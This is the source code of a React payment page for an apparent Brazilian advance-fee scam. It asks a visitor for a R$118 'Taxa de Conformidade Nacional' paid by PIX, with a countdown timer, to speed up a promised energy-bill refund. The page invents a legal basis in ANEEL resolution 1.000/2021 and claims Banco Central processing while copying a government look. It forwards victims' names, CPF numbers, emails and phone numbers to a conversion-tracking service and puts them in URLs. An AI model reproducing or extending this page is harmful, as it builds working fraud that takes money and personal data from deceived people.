import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { AlertTriangle, CheckCircle2, Info, Clock, DollarSign, FileText, ReceiptText, HelpCircle, LockKeyhole, Timer, Shield, ArrowRightCircle, Copy, Clipboard, CheckCircle, Loader } from "lucide-react";
import { useLocation } from "wouter";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Badge } from "@/components/ui/badge";
import { useToast } from "@/hooks/use-toast";
import { Toaster } from "@/components/ui/toaster";
import ScrollToTop from "@/components/ScrollToTop";
import { playNotificationSound } from "@/components/NotificationSound";
import { paymentApi } from "@/lib/for4payments";
import { sendPixGeneratedNotification, sendPaymentConfirmedNotification } from "@/lib/utmify";

// Funções de formatação
const formatarCPF = (cpf: string) => {
  return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
};

const formatarMoeda = (valor: number | string) => {
  const valorNumerico = typeof valor === 'string' ? parseFloat(valor) : valor;
  return valorNumerico.toLocaleString('pt-BR', {
    style: 'currency',
    currency: 'BRL',
  });
};

const formatarData = (dataString: string) => {
  const data = new Date(dataString);
  return data.toLocaleDateString('pt-BR', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit'
  });
};

export default function TaxaComplementar() {
  const [location, navigate] = useLocation();
  const { toast } = useToast();
  
  // Valor da Taxa de Conformidade Nacional (TCN)
  const VALOR_TAXA_CONFORMIDADE = 118;
  
  // Estados para gerenciar o pagamento
  const [pagamentoId, setPagamentoId] = useState("");
  const [pixCode, setPixCode] = useState("");
  const [pixQrCode, setPixQrCode] = useState("");
  const [status, setStatus] = useState<"idle" | "loading" | "success" | "paid" | "error">("idle");
  const [tempoRestante, setTempoRestante] = useState<number>(900); // 15 minutos em segundos
  const [copiado, setCopiado] = useState(false);
  const [verificandoPagamento, setVerificandoPagamento] = useState(false);
  
  // Estados para armazenar dados da solicitação
  const [protocolo, setProtocolo] = useState("");
  const [dataAtual, setDataAtual] = useState("");
  const [dataPagamento, setDataPagamento] = useState("");
  const [dadosSolicitacao, setDadosSolicitacao] = useState({
    nome: "",
    cpf: "",
    valor: "",
    companhia: "",
    estado: "",
    nasc: "",
    pagamentoId: "",
    email: "",
    telefone: "",
    agencia: "",
    conta: ""
  });
  
  // Copiar o código PIX para a área de transferência
  const copiarPix = async () => {
    if (pixCode) {
      try {
        await navigator.clipboard.writeText(pixCode);
        setCopiado(true);
        toast({
          title: "Código PIX copiado!",
          description: "O código PIX foi copiado para a área de transferência.",
          duration: 3000,
        });
        
        setTimeout(() => setCopiado(false), 3000);
      } catch (err) {
        toast({
          title: "Erro ao copiar código",
          description: "Não foi possível copiar o código PIX automaticamente. Por favor, copie manualmente.",
          variant: "destructive",
          duration: 3000,
        });
      }
    }
  };

  // Formatar o tempo restante em minutos e segundos
  const formatarTempoRestante = () => {
    const minutos = Math.floor(tempoRestante / 60);
    const segundos = tempoRestante % 60;
    return `${minutos.toString().padStart(2, '0')}:${segundos.toString().padStart(2, '0')}`;
  };
  
  // Iniciar verificação de status de pagamento
  const verificarStatusPagamento = async (pagamentoId: string) => {
    setVerificandoPagamento(true);
    try {
      const response = await fetch(`/api/pagamentos/${pagamentoId}/status`);
      if (!response.ok) {
        throw new Error('Erro ao verificar o status do pagamento');
      }
      
      const data = await response.json();
      console.log("Status do pagamento:", data);
      
      if (data.status === "PAID" || data.status === "COMPLETED") {
        setStatus("paid");
        
        // Redirecionar para a página de Liberação Acelerada
        const params = new URLSearchParams();
        params.append('nome', dadosSolicitacao.nome);
        params.append('cpf', dadosSolicitacao.cpf);
        params.append('email', dadosSolicitacao.email);
        params.append('telefone', dadosSolicitacao.telefone);
        params.append('valor', dadosSolicitacao.valor);
        params.append('companhia', dadosSolicitacao.companhia);
        params.append('estado', dadosSolicitacao.estado);
        params.append('nasc', dadosSolicitacao.nasc);
        params.append('pagamentoIdTCN', pagamentoId);
        params.append('dataPagamento', new Date().toISOString());
        
        playNotificationSound();
        
        setTimeout(() => {
          navigate(`/lar?${params.toString()}`);
        }, 2000);
      } else {
        // Continuar verificando a cada 10 segundos
        setTimeout(() => verificarStatusPagamento(pagamentoId), 10000);
      }
    } catch (error) {
      console.error("Erro ao verificar status do pagamento:", error);
      setTimeout(() => verificarStatusPagamento(pagamentoId), 15000);
    }
  };

  // Gerar pagamento PIX
  const gerarPagamentoPix = async () => {
    try {
      setStatus("loading");
      
      // Dados para criação do PIX
      const paymentData = {
        nome: dadosSolicitacao.nome,
        cpf: dadosSolicitacao.cpf,
        email: dadosSolicitacao.email,
        telefone: dadosSolicitacao.telefone,
        valor: 118.00 // R$ 118,00 para TCN
      };
      
      // Chamar API para gerar o PIX
      const response = await fetch('/api/pagamentos', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(paymentData),
      });
      
      if (!response.ok) {
        throw new Error('Erro ao gerar pagamento PIX');
      }
      
      const data = await response.json();
      console.log("Pagamento PIX gerado:", data);
      
      // Atualizar os estados com os dados do pagamento
      setPagamentoId(data.id);
      setPixCode(data.pixCode);
      setPixQrCode(data.pixQrCode);
      setStatus("success");
      
      // Tocar som de notificação
      playNotificationSound();
      
      // Enviar notificação para UTMify
      try {
        await sendPixGeneratedNotification(
          data.id,
          {
            name: dadosSolicitacao.nome,
            email: dadosSolicitacao.email,
            phone: dadosSolicitacao.telefone,
            document: dadosSolicitacao.cpf
          },
          11800, // R$ 118,00 em centavos
          undefined,
          "TCN" // Tipo de produto: TCN
        );
      } catch (error) {
        console.error("Erro ao enviar notificação para UTMify:", error);
      }
      
      // Iniciar verificação de status
      verificarStatusPagamento(data.id);
      
      // Iniciar contagem regressiva
      const interval = setInterval(() => {
        setTempoRestante((prev) => {
          if (prev <= 1) {
            clearInterval(interval);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
      
      return () => clearInterval(interval);
    } catch (error) {
      console.error("Erro ao gerar pagamento PIX:", error);
      setStatus("error");
      
      toast({
        title: "Erro ao gerar pagamento",
        description: "Não foi possível gerar o pagamento PIX. Por favor, tente novamente.",
        variant: "destructive",
        duration: 5000,
      });
    }
  };
  
  // Efeito para capturar os parâmetros da URL e atualizar o estado
  useEffect(() => {
    // Obter parâmetros da URL
    const params = new URLSearchParams(window.location.search);
    const cpf = params.get('cpf') || "";
    const nome = params.get('nome') || "";
    const valor = params.get('valor') || "0";
    const companhia = params.get('companhia') || "";
    const estado = params.get('estado') || "";
    const nasc = params.get('nasc') || "";
    const pagamentoId = params.get('pagamentoId') || "";
    const dataPag = params.get('dataPagamento') || new Date().toISOString();
    const email = params.get('email') || "";
    const telefone = params.get('telefone') || "";
    const agencia = params.get('agencia') || "";
    const conta = params.get('conta') || "";
    
    // Validar se temos os dados essenciais
    if (!cpf || !nome || !valor) {
      toast({
        title: "Dados incompletos",
        description: "Informações necessárias não encontradas. Voltando para a página inicial.",
        variant: "destructive"
      });
      
      setTimeout(() => {
        navigate("/");
      }, 3000);
      return;
    }
    
    // Atualizar estados
    setDadosSolicitacao({
      nome, cpf, valor, companhia, estado, nasc, pagamentoId, email, telefone, agencia, conta
    });
    
    setDataPagamento(dataPag);
    setDataAtual(new Date().toISOString());
    
    // Gerar número de protocolo baseado no CPF
    setProtocolo(`${cpf.substring(0, 4)}4714${cpf.substring(6, 9)}`);
  }, [location]);
  
  // Efeito para gerar o pagamento PIX automaticamente quando a página carregar
  useEffect(() => {
    // Só gerar o pagamento quando os dados da solicitação estiverem carregados
    if (dadosSolicitacao.cpf && dadosSolicitacao.nome) {
      gerarPagamentoPix();
    }
  }, [dadosSolicitacao.cpf, dadosSolicitacao.nome]);
  
  // Nota: O pagamento PIX é gerado automaticamente quando a página carrega
  
  // Calcula valores formatados
  const valorRestituicaoFormatado = formatarMoeda(parseFloat(dadosSolicitacao.valor));
  const valorTaxaConformidadeFormatado = formatarMoeda(VALOR_TAXA_CONFORMIDADE);
  const cpfFormatado = dadosSolicitacao.cpf ? formatarCPF(dadosSolicitacao.cpf) : "";
  
  return (
    <div className="min-h-screen flex flex-col">
      <ScrollToTop />
      <Header />
      
      <main className="flex-grow py-6 bg-gray-50">
        <div className="container mx-auto px-4 max-w-5xl">
          <div className="mb-6">
            <h1 className="text-2xl font-bold text-[#1351B4]">Taxa de Conformidade Nacional</h1>
            <p className="text-gray-600">Redução do prazo de recebimento e garantia de conformidade regulatória</p>
          </div>
          
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            <div className="md:col-span-2">
              <Card>
                <CardHeader className="bg-[#F8FAFC] border-b border-gray-100">
                  <div className="flex justify-between items-center">
                    <CardTitle className="text-[#1351B4] text-lg font-bold">Detalhes da Solicitação</CardTitle>
                    <Badge variant="outline" className="bg-[#e1f5fe] text-[#0277bd] border-[#0277bd]">
                      Protocolo: {protocolo}
                    </Badge>
                  </div>
                </CardHeader>
                <CardContent className="p-6">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div>
                      <h3 className="text-sm font-medium text-gray-500 mb-1">Nome do Solicitante</h3>
                      <p className="text-gray-900 font-semibold">{dadosSolicitacao.nome}</p>
                    </div>
                    <div>
                      <h3 className="text-sm font-medium text-gray-500 mb-1">CPF</h3>
                      <p className="text-gray-900 font-semibold">{cpfFormatado}</p>
                    </div>
                    <div>
                      <h3 className="text-sm font-medium text-gray-500 mb-1">Distribuidora de Energia</h3>
                      <p className="text-gray-900 font-semibold">{dadosSolicitacao.companhia}</p>
                    </div>
                    <div>
                      <h3 className="text-sm font-medium text-gray-500 mb-1">Estado</h3>
                      <p className="text-gray-900 font-semibold">{dadosSolicitacao.estado}</p>
                    </div>
                    <div>
                      <h3 className="text-sm font-medium text-gray-500 mb-1">Valor da Restituição</h3>
                      <p className="text-green-600 font-bold text-lg">{valorRestituicaoFormatado}</p>
                    </div>
                    <div>
                      <h3 className="text-sm font-medium text-gray-500 mb-1">Status</h3>
                      <div className="flex items-center">
                        <Badge className="bg-amber-100 text-amber-700 border-amber-200">
                          <Clock className="h-3 w-3 mr-1" />
                          Aguardando TCN
                        </Badge>
                      </div>
                    </div>
                  </div>
                  
                  <div className="mt-8">
                    <div className="border border-gray-200 rounded-lg bg-white shadow-sm p-6">
                      <div className="flex items-start">
                        <div className="bg-blue-50 rounded-full p-3 mr-4">
                          <Info className="h-6 w-6 text-[#1351B4]" />
                        </div>
                        <div>
                          <h3 className="font-bold text-[#1351B4] text-lg mb-2">Taxa de Conformidade Nacional (TCN)</h3>
                          <p className="text-gray-700 mb-4">
                            Para receber sua restituição em até 24 horas úteis (ao invés do prazo padrão de 10 dias úteis), 
                            é necessário o pagamento da Taxa de Conformidade Nacional no valor de {valorTaxaConformidadeFormatado}.
                          </p>
                          
                          <div className="bg-gray-50 border border-gray-200 rounded-md p-4 mb-6">
                            <h4 className="font-semibold text-gray-800 mb-2">Vantagens da TCN:</h4>
                            <ul className="space-y-2 text-gray-700">
                              <li className="flex items-start">
                                <CheckCircle2 className="h-5 w-5 text-green-500 mr-2 flex-shrink-0 mt-0.5" />
                                <span>Recebimento prioritário em até 24 horas úteis</span>
                              </li>
                              <li className="flex items-start">
                                <CheckCircle2 className="h-5 w-5 text-green-500 mr-2 flex-shrink-0 mt-0.5" />
                                <span>Conformidade com as normas ANEEL nº 1.000/2021</span>
                              </li>
                              <li className="flex items-start">
                                <CheckCircle2 className="h-5 w-5 text-green-500 mr-2 flex-shrink-0 mt-0.5" />
                                <span>Processamento em canal preferencial do Banco Central</span>
                              </li>
                              <li className="flex items-start">
                                <CheckCircle2 className="h-5 w-5 text-green-500 mr-2 flex-shrink-0 mt-0.5" />
                                <span>Suporte especializado para transferência bancária</span>
                              </li>
                            </ul>
                          </div>
                          
                          {/* Mostrar conteúdo com base no status do pagamento */}
                          {status === "loading" && (
                            <div className="mt-6 flex justify-center">
                              <div className="text-center">
                                <div className="inline-block animate-spin text-blue-600 mb-2">
                                  <Loader className="h-8 w-8" />
                                </div>
                                <p className="text-gray-600">Gerando pagamento PIX...</p>
                              </div>
                            </div>
                          )}
                          
                          {(status === "idle" || status === "error") && (
                            <div className="mt-6 flex justify-center">
                              <div className="text-center">
                                <div className="bg-amber-50 border border-amber-200 p-4 rounded-lg">
                                  <AlertTriangle className="h-6 w-6 text-amber-500 mx-auto mb-2" />
                                  <p className="text-amber-700">
                                    Não foi possível gerar o PIX automaticamente. Por favor, tente novamente em alguns instantes.
                                  </p>
                                </div>
                              </div>
                            </div>
                          )}
                          
                          {/* Exibir QR Code e código PIX */}
                          {status === "success" && (
                            <div className="mt-4 border-t border-gray-200 pt-6">
                              <div className="bg-white p-4 rounded-lg border border-gray-200 shadow-sm">
                                <h4 className="text-lg font-bold text-gray-900 mb-2 text-center">
                                  Pagamento PIX
                                </h4>
                                <p className="text-sm text-gray-600 mb-4 text-center">
                                  Valor: <span className="font-bold text-green-600">{valorTaxaConformidadeFormatado}</span>
                                </p>
                                
                                <div className="flex flex-col items-center">
                                  <div className="bg-white p-2 border border-gray-200 rounded-lg mb-4">
                                    <img src={pixQrCode} alt="QR Code PIX" className="h-48 w-48" />
                                  </div>
                                  
                                  <div className="w-full p-3 bg-gray-50 rounded-md border border-gray-200 flex flex-col mb-4">
                                    <p className="text-xs text-gray-500 mb-1">Código PIX (clique para copiar):</p>
                                    <div 
                                      onClick={copiarPix}
                                      className="bg-white p-3 rounded border border-gray-200 text-xs text-gray-800 font-mono cursor-pointer hover:bg-blue-50 transition-colors relative overflow-auto break-all"
                                    >
                                      {pixCode}
                                      <div className="absolute top-2 right-2">
                                        {copiado ? (
                                          <div className="bg-green-100 text-green-600 p-1 rounded-full">
                                            <CheckCircle2 className="h-4 w-4" />
                                          </div>
                                        ) : (
                                          <div className="text-blue-500 hover:text-blue-700">
                                            <Copy className="h-4 w-4" />
                                          </div>
                                        )}
                                      </div>
                                    </div>
                                  </div>
                                  
                                  <div className="text-center text-sm text-gray-600 mb-2">
                                    <div className="flex items-center justify-center mb-1">
                                      <Clock className="h-4 w-4 text-amber-500 mr-1" />
                                      <span>Tempo restante: <b>{formatarTempoRestante()}</b></span>
                                    </div>
                                    <p>Abrindo seu aplicativo bancário...</p>
                                  </div>
                                  
                                  <div className="w-full mt-4 space-y-2">
                                    <div className="text-xs text-gray-500 bg-blue-50 p-3 rounded-md border border-blue-100">
                                      <p className="mb-1 font-medium text-blue-700">Como pagar:</p>
                                      <ol className="list-decimal list-inside space-y-1 text-gray-600">
                                        <li>Abra o app do seu banco</li>
                                        <li>Escolha pagar com PIX</li>
                                        <li>Escaneie o QR code ou cole o código PIX</li>
                                        <li>Confirme as informações e finalize o pagamento</li>
                                      </ol>
                                    </div>
                                    
                                    <Button
                                      className="w-full bg-amber-600 hover:bg-amber-700 mt-2"
                                      onClick={copiarPix}
                                    >
                                      <Clipboard className="h-4 w-4 mr-2" />
                                      {copiado ? "Código copiado!" : "Copiar código PIX"}
                                    </Button>
                                    
                                    <p className="text-center text-xs text-gray-500 mt-2">
                                      Assim que o pagamento for confirmado, você será 
                                      redirecionado automaticamente
                                    </p>
                                  </div>
                                </div>
                              </div>
                            </div>
                          )}
                          
                          {status === "paid" && (
                            <div className="mt-6 p-4 bg-green-50 rounded-lg border border-green-300">
                              <CheckCircle2 className="h-8 w-8 text-green-600 mx-auto mb-2" />
                              <h4 className="text-lg font-semibold text-center text-green-800 mb-2">
                                Pagamento Confirmado!
                              </h4>
                              <p className="text-sm text-green-700 text-center">
                                Seu pagamento foi processado com sucesso. Você será redirecionado em instantes...
                              </p>
                            </div>
                          )}
                          
                          {/* Botão para testes - Pular para a página LAR */}
                          <div className="mt-4">
                            <Button 
                              variant="ghost" 
                              className="w-full items-center justify-center text-blue-700 border border-blue-300"
                              onClick={() => {
                                const params = new URLSearchParams();
                                
                                // Adicionar todos os dados necessários para a próxima página
                                Object.entries(dadosSolicitacao).forEach(([key, value]) => {
                                  params.append(key, value);
                                });
                                
                                params.append('valorTCN', VALOR_TAXA_CONFORMIDADE.toString());
                                params.append('protocolo', protocolo);
                                params.append('pagamentoIdTCN', 'test-payment-id-tcn');
                                params.append('dataPagamento', new Date().toISOString());
                                
                                // Redirecionar para a página LAR
                                navigate(`/lar?${params.toString()}`);
                              }}
                            >
                              <div className="flex items-center">
                                <ArrowRightCircle className="h-4 w-4 mr-2" />
                                TESTE: Pular para LAR
                              </div>
                            </Button>
                            <p className="text-xs text-purple-600 mt-1 text-center">
                              (Apenas para testes: Pula o pagamento da TCN e vai direto para a próxima etapa)
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
              
              <div className="mt-6">
                <Alert variant="default" className="bg-amber-50 border-amber-200 text-amber-800">
                  <AlertTriangle className="h-4 w-4 text-amber-600" />
                  <AlertTitle>Prazo de recebimento</AlertTitle>
                  <AlertDescription>
                    Sem a Taxa de Conformidade Nacional, o prazo para recebimento da restituição é de 10 dias úteis.
                  </AlertDescription>
                </Alert>
              </div>
            </div>
            
            <div>
              <Card>
                <CardHeader className="bg-green-50 border-b border-green-100">
                  <CardTitle className="text-green-700 text-lg flex items-center">
                    <Shield className="h-5 w-5 mr-2" />
                    Informações Importantes
                  </CardTitle>
                </CardHeader>
                <CardContent className="p-5 space-y-5">
                  <div>
                    <h3 className="font-medium text-gray-800 mb-1 flex items-center">
                      <Clock className="h-4 w-4 text-[#1351B4] mr-2" />
                      Prazo de Recebimento
                    </h3>
                    <p className="text-sm text-gray-600">
                      Com a TCN: <span className="font-semibold text-green-600">Até 24h úteis</span><br />
                      Sem a TCN: <span className="font-semibold text-gray-700">10 dias úteis</span>
                    </p>
                  </div>
                  
                  <div>
                    <h3 className="font-medium text-gray-800 mb-1 flex items-center">
                      <DollarSign className="h-4 w-4 text-[#1351B4] mr-2" />
                      Valores
                    </h3>
                    <p className="text-sm text-gray-600">
                      Restituição: <span className="font-semibold text-green-600">{valorRestituicaoFormatado}</span><br />
                      Taxa TCN: <span className="font-semibold text-gray-700">{valorTaxaConformidadeFormatado}</span>
                    </p>
                  </div>
                  
                  <div>
                    <h3 className="font-medium text-gray-800 mb-1 flex items-center">
                      <FileText className="h-4 w-4 text-[#1351B4] mr-2" />
                      Base Legal
                    </h3>
                    <p className="text-sm text-gray-600">
                      A Taxa de Conformidade Nacional está prevista na resolução ANEEL nº 1.000/2021, garantindo a 
                      conformidade regulatória e o processamento prioritário.
                    </p>
                  </div>
                  
                  <div>
                    <h3 className="font-medium text-gray-800 mb-1 flex items-center">
                      <ReceiptText className="h-4 w-4 text-[#1351B4] mr-2" />
                      Pagamento
                    </h3>
                    <p className="text-sm text-gray-600">
                      O pagamento é realizado exclusivamente via PIX, garantindo rapidez e segurança na transação.
                    </p>
                  </div>
                  
                  <div>
                    <h3 className="font-medium text-gray-800 mb-1 flex items-center">
                      <HelpCircle className="h-4 w-4 text-[#1351B4] mr-2" />
                      Dúvidas?
                    </h3>
                    <p className="text-sm text-gray-600">
                      Em caso de dúvidas, consulte a seção de perguntas frequentes ou entre em contato com nossa central de atendimento.
                    </p>
                  </div>
                  
                  <div className="bg-blue-50 p-3 rounded-md border border-blue-100 mt-4">
                    <div className="flex items-center">
                      <LockKeyhole className="h-5 w-5 text-blue-600 mr-2" />
                      <h3 className="font-semibold text-blue-700">Transação Segura</h3>
                    </div>
                    <p className="text-xs text-blue-600 mt-1">
                      Todos os dados e pagamentos são processados com a mais alta segurança, seguindo os padrões do Banco Central.
                    </p>
                  </div>
                </CardContent>
              </Card>
            </div>
          </div>
        </div>
      </main>
      
      <Footer />
    </div>
  );
}